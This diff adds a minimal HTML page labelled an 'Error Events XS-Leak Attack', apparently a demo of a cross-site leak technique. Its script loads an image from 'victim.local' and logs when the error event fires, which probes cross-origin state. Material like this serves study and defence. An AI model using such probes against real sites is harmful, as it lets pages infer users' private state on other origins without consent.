@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Error Events XS-Leak Attack</title>
+</head>
+<body>
+    <h1>Error Events XS-Leak Attack</h1>
+    <script>
+        const img = document.createElement('img');
+        img.src = "http://victim.local/non-existent-image.png";
+        img.onerror = () => {
+            console.log('Error event triggered');
+        };
+        document.body.appendChild(img);
+    </script>
+</body>
+</html>
